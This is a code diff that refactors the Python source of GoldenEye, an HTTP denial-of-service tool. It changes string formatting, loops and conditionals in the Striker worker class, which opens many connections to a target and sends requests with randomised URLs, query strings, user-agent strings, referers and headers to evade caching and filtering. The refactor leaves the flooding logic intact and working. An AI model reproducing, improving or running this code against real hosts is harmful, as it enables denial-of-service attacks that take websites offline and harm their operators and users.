@@ -172,8 +172,6 @@ class GoldenEye(object):
                 worker.start()
             except Exception:
                 error("Failed to start worker {0}".format(i))
-                pass
-
         if DEBUG:
             print("Initiating monitor")
         self.monitor()
@@ -216,8 +214,6 @@ class GoldenEye(object):
                         pass # silently ignore
                 if DEBUG:
                     raise
-                else:
-                    pass
 
 ####
 # Striker Class
@@ -273,8 +269,8 @@ class Striker(Process):
             'http://www.bing.com/',
             'http://www.baidu.com/',
             'http://www.yandex.com/',
-            'http://' + self.host + '/'
-            ]
+            f'http://{self.host}/',
+        ]
 
 
     def __del__(self):
@@ -291,7 +287,7 @@ class Striker(Process):
 
         validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
 
-        for i in range(0, size):
+        for _ in range(0, size):
             a = random.choice(validChars)
             out_str += chr(a)
 
@@ -307,13 +303,17 @@ class Striker(Process):
 
             try:
 
-                for i in range(self.nr_socks):
-
+                for _ in range(self.nr_socks):
                     if self.ssl:
-                        if SSLVERIFY:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
-                        else:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
+                        c = (
+                            HTTPCLIENT.HTTPSConnection(self.host, self.port)
+                            if SSLVERIFY
+                            else HTTPCLIENT.HTTPSConnection(
+                                self.host,
+                                self.port,
+                                context=ssl._create_unverified_context(),
+                            )
+                        )
                     else:
                         c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
@@ -338,9 +338,6 @@ class Striker(Process):
                 self.incFailed()
                 if DEBUG:
                     raise
-                else:
-                    pass # silently ignore
-
         if DEBUG:
             print("Worker {0} completed run. Sleeping...".format(self.name))
 
@@ -358,19 +355,16 @@ class Striker(Process):
 
         random_keys = list(headers.keys())
         random.shuffle(random_keys)
-        random_headers = {}
-
-        for header_name in random_keys:
-            random_headers[header_name] = headers[header_name]
-
+        random_headers = {
+            header_name: headers[header_name] for header_name in random_keys
+        }
         return (req_url, random_headers)
 
     def generateQueryString(self, ammount = 1):
 
         queryString = []
 
-        for i in range(ammount):
-
+        for _ in range(ammount):
             key = self.buildblock(random.randint(3,10))
             value = self.buildblock(random.randint(3,20))
             element = "{0}={1}".format(key, value)
@@ -382,14 +376,10 @@ class Striker(Process):
     def generateData(self):
 
         returnCode = 0
-        param_joiner = "?"
-
         if len(self.url) == 0:
             self.url = '/'
 
-        if self.url.count("?") > 0:
-            param_joiner = "&"
-
+        param_joiner = "&" if self.url.count("?") > 0 else "?"
         request_url = self.generateRequestUrl(param_joiner)
 
         http_headers = self.generateRandomHeaders()
@@ -427,27 +417,27 @@ class Striker(Process):
             browser_string = random.choice(browser['name'])
 
             if 'ext_pre' in browser:
-                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)
+                browser_string = f"{random.choice(browser['ext_pre'])}; {browser_string}"
 
-            sysinfo = "%s; %s" % (browser_string, sysinfo)
+            sysinfo = f"{browser_string}; {sysinfo}"
 
             if 'ext_post' in browser:
-                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))
+                sysinfo = f"{sysinfo}; {random.choice(browser['ext_post'])}"
 
 
         if 'ext' in os and os['ext']:
-            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))
+            sysinfo = f"{sysinfo}; {random.choice(os['ext'])}"
 
-        ua_string = "%s (%s)" % (mozilla_version, sysinfo)
+        ua_string = f"{mozilla_version} ({sysinfo})"
 
         if 'name' in platform and platform['name']:
-            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))
+            ua_string = f"{ua_string} {random.choice(platform['name'])}"
 
         if 'details' in platform and platform['details']:
-            ua_string = "%s (%s)" % (ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0] )
+            ua_string = f"{ua_string} ({random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0]})"
 
         if 'extensions' in platform and platform['extensions']:
-            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))
+            ua_string = f"{ua_string} {random.choice(platform['extensions'])}"
 
         return ua_string
 
@@ -462,7 +452,7 @@ class Striker(Process):
         # Random accept encoding
         acceptEncoding = ['\'\'','*','identity','gzip','deflate']
         random.shuffle(acceptEncoding)
-        nrEncodings = random.randint(1,int(len(acceptEncoding)/2))
+        nrEncodings = random.randint(1, len(acceptEncoding) // 2)
         roundEncodings = acceptEncoding[:nrEncodings]
 
         http_headers = {
@@ -491,7 +481,7 @@ class Striker(Process):
             random_referer = random.choice(self.referers) + url_part
 
             if random.randrange(2) == 0:
-                random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
+                random_referer = f'{random_referer}?{self.generateQueryString(random.randint(1, 10))}'
 
             http_headers['Referer'] = random_referer
 
@@ -576,10 +566,10 @@ def main():
             usage()
             sys.exit()
 
-        if url[0:4].lower() != 'http':
+        if url[:4].lower() != 'http':
             error("Invalid URL supplied")
 
-        if url == None:
+        if url is None:
             error("No URL supplied")
 
         opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])
@@ -613,7 +603,7 @@ def main():
                 else:
                     error("method {0} is invalid".format(a))
             else:
-                error("option '"+o+"' doesn't exists")
+                error(f"option '{o}' doesn't exists")
 
 
         if uas_file:
